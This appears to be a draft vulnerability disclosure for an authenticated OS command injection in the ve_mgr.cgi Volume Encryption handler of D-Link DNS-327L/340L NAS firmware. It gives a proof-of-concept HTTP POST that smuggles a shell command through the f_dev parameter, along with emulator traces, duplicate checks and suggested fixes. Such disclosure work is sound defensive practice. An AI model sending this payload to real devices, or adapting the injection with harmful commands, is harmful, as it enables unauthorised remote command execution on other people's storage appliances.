# Vulnerability Submission: D-Link DNS-327L / DNS-340L ve_mgr.cgi OS Command Injection

## Basic Information

| Field | Value |
|-------|-------|
| VulnDB ID | Pending assignment |
| CVE ID | Pending assignment |
| CWE ID | CWE-78 |
| CVSS v3.1 Score | 8.8 |
| CVSS v3.1 Vector | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| Vulnerability Type | OS Command Injection |
| Internal ID | DLINK-CMD-004 |

## Affected Product

| Field | Value |
|-------|-------|
| Vendor | D-Link |
| Product | DNS-327L ShareCenter; DNS-340L ShareCenter |
| Confirmed Firmware Versions | DNS-327L REVA 1.10B02; DNS-340L REVA 1.01B04 |
| Confirmed Firmware Images | dlink-DNS__DNS-327L_REVA_FIRMWARE_v1.10B02.zip; dlink-DNS__DNS-340L_REVA_FIRMWARE_1.01B04.ZIP |
| Affected Binary | cgi/disk_mgr/ve_mgr.cgi |
| Web Endpoint | /cgi-bin/ve_mgr.cgi |
| Architecture | ARM EABI5 little-endian |
| Confirmed Binary SHA1 | DNS-327L 1.10B02: 1fb0d79c943d90d366fddcd55517c24ffda0f93c; DNS-340L 1.01B04: 01f936a2badbed4cf55be6ab05f9c6458d016f08 |

## Description

The `ve_mgr.cgi` CGI handler implements the Volume Encryption management workflow. In the `cgi_VE_PWD_Check` branch, the HTTP POST parameter `f_dev` is concatenated into a shell command that pipes the supplied password to `cryptsetup`:

```text
echo "<f_pwd>\n" | cryptsetup -q luksChangeKey <f_dev>
```

The command is executed through `/bin/sh -c`. Because `f_dev` is not shell-metacharacter neutralized before being appended to the command line, an authenticated web attacker can inject shell metacharacters and execute arbitrary commands as the CGI process user.

The vulnerable path is reachable from the authenticated Volume Encryption UI. `hd_veDiag.js` sends POST requests to `/cgi-bin/ve_mgr.cgi` with `cmd=cgi_VE_PWD_Check`, `f_dev`, and `f_pwd` before mount and modify operations.

## Impact

Successful exploitation allows authenticated remote command execution on the NAS appliance. The attacker can run arbitrary shell commands, alter device state, access stored data, or disrupt storage services.

This draft is limited to the two firmware images where runtime marker files were created from the `f_dev` parameter. DNS-320L 1.10B03 and DNS-345 1.01 / 1.03B06 / 1.04.B02 / 1.05b04 HOTFIX were also tested, but they did not produce controlled marker files or unescaped controlled shell command lines for this VE branch and are not included as confirmed affected.

## Proof of Concept

Low-impact marker example:

```http
POST /cgi-bin/ve_mgr.cgi HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

cmd=cgi_VE_PWD_Check&f_dev=a2;touch /tmp/DLINK_CMD_004_ve_dev.hit;#&f_pwd=firmrecpass
```

## Runtime Evidence

Focused verification artifacts:

- `scripts/oneoff/verify_ve_mgr_branch_params_20260526.py`
- `inout/reports/0day_verification_20260526/ve_mgr_branch_params_runtime_20260526.json`
- `inout/reports/0day_verification_20260526/ve_mgr_branch_params_triage_20260526.md`
- `inout/reports/0day_verification_20260526/ve_mgr_duplicate_check_20260526.json`
- `inout/reports/0day_verification_20260526/ve_mgr_duplicate_check_20260526.md`

Runtime summary:

| Firmware | Binary SHA1 | Marker hits | Controlled shell traces |
|----------|-------------|-------------|-------------------------|
| DNS-327L 1.10B02 | 1fb0d79c943d90d366fddcd55517c24ffda0f93c | 1 | 3 |
| DNS-340L 1.01B04 | 01f936a2badbed4cf55be6ab05f9c6458d016f08 | 1 | 3 |

Representative qemu strace evidence:

DNS-327L 1.10B02:

```text
execve("/bin/sh",{"sh","-c","echo "firmrecpass
" | cryptsetup -q luksChangeKey a2;echo FIRMREC_DNS327L_110B02_VE_MGR_20260526_pwd_dev > /tmp/FIRMREC_DNS327L_110B02_VE_MGR_20260526_pwd_dev.hit;#",NULL})
```

DNS-340L 1.01B04:

```text
execve("/bin/sh",{"sh","-c","echo "firmrecpass
" | cryptsetup -q luksChangeKey a2;echo FIRMREC_DNS340L_101B04_VE_MGR_20260526_pwd_dev > /tmp/FIRMREC_DNS340L_101B04_VE_MGR_20260526_pwd_dev.hit;#",NULL})
```

The temporary qemu sysroots contained the marker files:

```text
FIRMREC_DNS327L_110B02_VE_MGR_20260526_pwd_dev.hit
FIRMREC_DNS340L_101B04_VE_MGR_20260526_pwd_dev.hit
```

The verifier repairs runtime symlink placeholders in temporary sysroots only, including busybox applet links and libc soname links, before running direct CGI POST probes under `qemu-arm-static`.

## Public Duplicate Check

Public duplicate checks on 2026-05-26 did not find a directly matching public CVE or disclosure for D-Link `ve_mgr.cgi` command injection through `cgi_VE_PWD_Check` or `f_dev`.

NVD API checks:

| Query | Result |
|-------|--------|
| `ve_mgr.cgi` | 0 CVE records |
| `cgi_VE_PWD_Check` | 0 CVE records |
| `D-Link ve_mgr.cgi command injection` | 0 CVE records |
| `DNS-327L ve_mgr.cgi` | 0 CVE records |
| `DNS-340L ve_mgr.cgi` | 0 CVE records |
| `D-Link Volume Encryption cryptsetup` | 0 CVE records |
| `cryptsetup D-Link DNS-340L` | 0 CVE records |

Manual web search terms also checked:

```text
"ve_mgr.cgi" "D-Link"
"cgi_VE_PWD_Check"
"D-Link" "Volume Encryption" "cryptsetup"
"DNS-340L" "cryptsetup" vulnerability
```

Broader D-Link DNS command-injection searches return known same-family prior art for other endpoints such as `nas_sharing.cgi`, `webfile_mgr.cgi`, `network_mgr.cgi`, `system_mgr.cgi`, and related storage handlers. Those records are relevant prior art but are not direct duplicates of the verified `ve_mgr.cgi` `cgi_VE_PWD_Check` / `f_dev` cryptsetup command path.

No search pass can prove global non-existence of private, vendor-only, paywalled, or poorly indexed reports. Repeat the duplicate check immediately before external filing.

## Discovery

| Field | Value |
|-------|-------|
| Discovery Method | FirmRec cross-firmware vulnerability mining plus branch-aware runtime verification |
| Date Verified | 2026-05-26 |
| Verification | Direct CGI POST probes in restored D-Link DNS rootfs images under qemu-arm-static with command markers |

## Suggested Fix

1. Replace shell-based command construction with argument-vector APIs such as `execve()` that do not invoke `/bin/sh`.
2. Treat `f_dev` as a device identifier, not a shell fragment; enforce a strict allowlist such as expected volume/device names only.
3. Reject shell metacharacters, command substitutions, whitespace, path traversal, and unexpected separators in Volume Encryption parameters.
4. Add server-side authorization and CSRF protections for Volume Encryption management actions.

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-05-26 | Vulnerability verified with runtime marker evidence |
| TBD | Reported to D-Link PSIRT |
| TBD | CVE ID assigned |
| TBD | Public disclosure |
